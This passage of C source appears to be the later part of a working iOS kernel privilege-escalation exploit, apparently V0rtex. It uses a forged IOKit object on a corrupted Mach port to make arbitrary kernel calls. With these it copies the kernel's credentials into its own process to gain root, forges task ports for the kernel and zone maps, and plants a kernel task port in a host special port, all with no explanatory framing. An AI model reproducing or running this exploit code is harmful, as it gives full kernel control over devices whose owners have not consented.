    pthread_t faltyVtabThread = 0;
    pthread_create(&faltyVtabThread, 0, (void*(*)(void*))spinner_nonempty, vtab);
    
    fakeobj = (kobj_t*)(((uint64_t)kport)+sizeof(kport_t));
    printf("fakeobj=%p\n",fakeobj);
    
    memset(fakeobj, 0, sizeof(kobj_t));
    
    fakeobj->a.vtab = vtab;
    fakeobj->a.refs = 100;
    fakeobj->a.trap_ptr = &fakeobj->a.obj;
    fakeobj->a.break_stuff = 0;
    fakeobj->b.__ipc = 100;
    
    kport->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    kport->ip_kobject = fakeobj;
    
    
    // First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
    // That way it can take way less arguments, but well, it can pass zero as first arg.
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
fakeobj->a.obj = (kptr_t)(x0), \
fakeobj->a.func = (kptr_t)(addr), \
(kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
#define KCALL_ZERO(addr, x0, x1, x2) \
( \
fakeobj->a.obj = (((uint64_t)&fakeobj->a.indirect) - 2 * sizeof(kptr_t)), \
fakeobj->a.func = OFF(osserializer_serialize), \
fakeobj->a.indirect[0] = (x0), \
fakeobj->a.indirect[1] = (x1), \
fakeobj->a.indirect[2] = (addr), \
(kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
)
    
    host_t host = mach_host_self();
    
    kptr_t kernel_task_addr = 0;
    int r = KCALL(OFF(copyout), OFF(kernel_task), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    printf("kernel_task=%p, %s\n",(void*)kernel_task_addr, mach_error_string(r));
    assure(!r);
    
    kptr_t kernproc_addr = 0;
    r = KCALL(OFF(copyout), kernel_task_addr + off->task_bsd_info, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    printf("kernproc_addr=%p, %s\n",(void*)kernproc_addr, mach_error_string(r));
    assure(!r);
    
    kptr_t kern_ucred = 0;
    r = KCALL(OFF(copyout), kernproc_addr + off->proc_ucred, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    printf("kern_ucred=%p, %s\n",(void*)kern_ucred, mach_error_string(r));
    assure(!r);
    
    kptr_t self_proc = 0;
    r = KCALL(OFF(copyout), self_task + off->task_bsd_info, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    printf("self_proc=%p, %s\n",(void*)self_proc, mach_error_string(r));
    assure(!r);
    
    kptr_t self_ucred = 0;
    r = KCALL(OFF(copyout), self_proc + off->proc_ucred, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    printf("self_ucred=%p, %s\n",(void*)self_ucred, mach_error_string(r));
    assure(!r);
    
    int olduid = getuid();
    printf("uid: %u\n", olduid);
    
    KCALL(OFF(kauth_cred_ref), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(copyin), &kern_ucred, self_proc + off->proc_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    printf("stole the kernel's credentials\n");
    setuid(0); // update host port
    
    int newuid = getuid();
    printf("uid: %u\n", newuid);
    
    if(newuid != olduid)
    {
        KCALL_ZERO(OFF(chgproccnt), newuid, 1, 0);
        KCALL_ZERO(OFF(chgproccnt), olduid, -1, 0);
    }
    
    host_t realhost = mach_host_self();
    printf("realhost: %x (host: %x)\n", realhost, host);
    
    ktask_t zm_task_buf = {};
    
    zm_task_buf.a.lock.data = 0x0;
    zm_task_buf.a.lock.type = 0x22;
    zm_task_buf.a.ref_count = 100;
    zm_task_buf.a.active = 1;
    zm_task_buf.b.itk_self = 1;
    zm_task_buf.a.map = zone_map_addr;
    
    ktask_t km_task_buf = {};
    
    km_task_buf.a.lock.data = 0x0;
    km_task_buf.a.lock.type = 0x22;
    km_task_buf.a.ref_count = 100;
    km_task_buf.a.active = 1;
    km_task_buf.b.itk_self = 1;
    
    
    r = KCALL(OFF(copyout), OFF(kernel_map), &km_task_buf.a.map, sizeof(km_task_buf.a.map), 0, 0, 0, 0);
    printf("kernel_map=%p, %s\n",(void*)km_task_buf.a.map, mach_error_string(r));
    assure(!r && km_task_buf.a.map);
    
    
    kptr_t ipc_space_kernel = 0;
    r = KCALL(OFF(copyout), IOSurfaceRootUserClient_port + offsetof(kport_t, ip_receiver), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    printf("ipc_space_kernel=%p, %s\n",(void*)ipc_space_kernel, mach_error_string(r));
    assure(!r && ipc_space_kernel);
    
    
    kmap_hdr_t zm_hdr = { 0 };
    r = KCALL(OFF(copyout), zm_task_buf.a.map + off->vm_map_hdr, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    printf("zm_range: %016llx-%016llx, %s\n", zm_hdr.start, zm_hdr.end, mach_error_string(r));
    assure(!r && zm_hdr.start && zm_hdr.end);
    
    if(zm_hdr.end - zm_hdr.start > 0x100000000){
        printf("zone_map is too big, sorry.\n");
        assure(0);
    }
    
    kptr_t zm_tmp = 0; // macro scratch space
#   define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
)
    
    kptr_t zm_task_addr = ZM_FIX_ADDR(KCALL(OFF(kalloc_external), sizeof(ktask_t), 0, 0, 0, 0, 0, 0));
    printf("zm_task_addr=%p\n",(void*)zm_task_addr);
    
    kptr_t km_task_addr = ZM_FIX_ADDR(KCALL(OFF(kalloc_external), sizeof(ktask_t), 0, 0, 0, 0, 0, 0));
    printf("km_task_addr=%p\n",(void*)km_task_addr);
    
    
    
    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    printf("zm_port addr: %p\n", (void*)ptrs[0]);
    printf("km_port addr: %p\n", (void*)ptrs[1]);
    
    
    r = KCALL(OFF(copyin), &zm_task_buf, zm_task_addr, sizeof(ktask_t), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    r = KCALL(OFF(copyin), &km_task_buf, km_task_addr, sizeof(ktask_t), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    
    
    KCALL(OFF(ipc_kobject_set), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(ipc_kobject_set), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
    
    
    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    
    mach_msg_type_number_t mapsNum = 0;
    mach_port_array_t maps = NULL;
    ret = mach_ports_lookup(mach_task_self(), &maps, &mapsNum);
    printf("mach_ports_lookup: %s\n", mach_error_string(ret));
    assure(!ret);
    
    printf("zone_map port: %x\n", maps[0]);
    printf("kernel_map port: %x\n", maps[1]);
    assure(MACH_PORT_VALID(maps[0]) && MACH_PORT_VALID(maps[1]));
    
    // Clean out the pointers without dropping refs
    ptrs[0] = ptrs[1] = 0;
    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    
    mach_vm_address_t remap_addr = 0;
    vm_prot_t cur = 0,
    max = 0;
    
    ret = mach_vm_remap(maps[1], &remap_addr, off->sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    printf("mach_vm_remap: %s\n", mach_error_string(ret));
    assure(!ret);
    
    printf("remap_addr: 0x%016llx\n", remap_addr);
    
    ret = mach_vm_wire(realhost, maps[1], remap_addr, off->sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    printf("mach_vm_wire: %s\n", mach_error_string(ret));
    assure(!ret);
    
    
    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    printf("newport=%p\n",(void*)newport);
    
    KCALL(OFF(ipc_kobject_set), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    
    KCALL(OFF(ipc_port_make_send), newport, 0, 0, 0, 0, 0, 0);
    
    r = KCALL(OFF(copyin), &newport, OFF(realhost) + off->realhost_special + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    printf("kernel_task=%x, %s\n",kernel_task, mach_error_string(r));
    assure(!r && MACH_PORT_VALID(kernel_task));
    
    // --------------- CLEAN UP V0RTEX -----------
    printf("cleaning up...\n");
    usleep(100000); // Allow logs to propagate
    
    RELEASE_PORT(maps[0]);
    RELEASE_PORT(maps[1]);
    
    
    KCALL(OFF(kfree), zm_task_addr, sizeof(ktask_t), 0, 0, 0, 0, 0);
    KCALL(OFF(kfree), km_task_addr, sizeof(ktask_t), 0, 0, 0, 0, 0);
    
    // --------------- CLEAN UP EXPLOIT -----------
    
    //move kcall vtable to kernel
    
    kptr_t kvtab = 0;
    assure(!mach_vm_allocate(kernel_task, &kvtab, NEW_DEVICES_PAGESIZE, VM_FLAGS_ANYWHERE));
    
    
    r = KCALL(OFF(copyin), vtab, kvtab, NEW_DEVICES_PAGESIZE, 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    fakeobj->a.vtab = kvtab;
    
    //stop vtab spinner
    vtab[0] = 0;
    pthread_join(faltyVtabThread, NULL);
    free(vtab);
    
    
#warning DEBUG
    callback(kernel_task,kbase,cb_data);
    
    
    
    char warn[] =
    "WARNING THIS CLEANUP IS INCOMPLETE!!!!!!\n"
    "IT WILL LIKELY STILL PANIC AFTER THIS LINE HERE\n"
    "--------------------------------------------------------------\n";
    printf("%s\n",warn);
    
    mach_port_t moreCorrupt = 0;
    while ((moreCorrupt = recv_msgs_nospray())){
        printf("fixing corrupt port=%x\n",moreCorrupt);
        size_t size = 0;
        kptr_t adr_corrupt_port = 0;
        kport_t toFixPort = {};
        
        ret = mach_ports_register(mach_task_self(), &moreCorrupt, 1);
        ret = mach_vm_read_overwrite(kernel_task, self_task + off->task_itk_registered, 8, &adr_corrupt_port, &size);
        
        ret = mach_vm_read_overwrite(kernel_task, adr_corrupt_port, sizeof(toFixPort), &toFixPort, &size);//don't need me
        
        kptr_t adr_msgs_cor_port = 0;
        ret = mach_vm_read_overwrite(kernel_task, adr_corrupt_port+offsetof(kport_t, ip_messages.port.messages), 8, &adr_msgs_cor_port, &size);
        
        kptr_t adr_mach_msg_header = 0;
        ret = mach_vm_read_overwrite(kernel_task, adr_msgs_cor_port+0x18, 8, &adr_mach_msg_header, &size);
        
        //technically 0x24 is an offset, but that's in mach message and won't change
        kptr_t badptr = adr_mach_msg_header+0x24;
        
        kptr_t newptr = ZM_FIX_ADDR(KCALL(OFF(kalloc_external), 16, 0, 0, 0, 0, 0, 0));
        
        
        uint64_t nullVar = 0;
        ret = mach_vm_write(kernel_task, newptr, &nullVar, 8);
        ret = mach_vm_write(kernel_task, newptr+8, &nullVar, 8);
        ret = mach_vm_write(kernel_task, badptr, &newptr, 8);
        
        
        assure(!recv_msgs_single(moreCorrupt)); //this should only receive MACH_PORT_NULL
        
        printf("");
    }
    
    ret = mach_ports_register(mach_task_self(), NULL, 0); //unregister fixed up rcv ports
    
    
    //final cleanup
    
    kport->ip_bits = 0x80000000; // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
    kport->ip_references = 100;
    kport->ip_kobject = 0;
    
    if (kvtab) {
        assure(!mach_vm_deallocate(kernel_task, kvtab, NEW_DEVICES_PAGESIZE));
    }
    
    assure(!mach_port_deallocate(mach_task_self(), fakeport));
    printf("done\n");
error:
    //stop kport spinner
    *(uint64_t*)&kport->ip_bits = 0;
    pthread_join(faultyThread, NULL);
    
    if (err) {
        printf("error=%d ret=0x%08x s=%s\n",err,ret,mach_error_string(ret));
    }else{
        printf("hack succeeded!\n");
        
//        if (callback) {
//            callback(kernel_task,kbase,cb_data);
//        }
        
        printf("");
    }
    
    
    //    exit(err);
    
    return err;
}

